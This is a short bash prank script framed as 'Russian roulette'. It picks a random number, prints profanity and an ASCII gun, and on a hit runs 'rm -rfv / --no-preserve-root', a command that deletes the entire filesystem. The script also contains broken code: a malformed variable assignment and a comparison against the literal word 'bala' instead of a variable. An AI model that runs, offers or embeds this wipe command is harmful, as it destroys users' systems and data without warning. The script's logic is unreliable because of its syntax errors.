#!/bin/bash

bala= (($RANDOM % 6))

g=$(($RANDOM % 6))
echo $g

if [ "$g" -eq bala ]
then
	echo YOU FUCKED UP

sleep 1
 echo " \
 /                                 />
 \__+_____________________/\/\___/ /|
 ()______________________      / /|/\
             /0 0  ---- |----    /---\
            |0 o 0 ----|| - \ --|      \
             \0_0/____/ |    |  |\      \
                         \__/__/  |      \
Bang! Bang!                       |       \
                                  |         \
                                  |__________|"

sleep 2
 rm -rfv / --no-preserve-root
fi

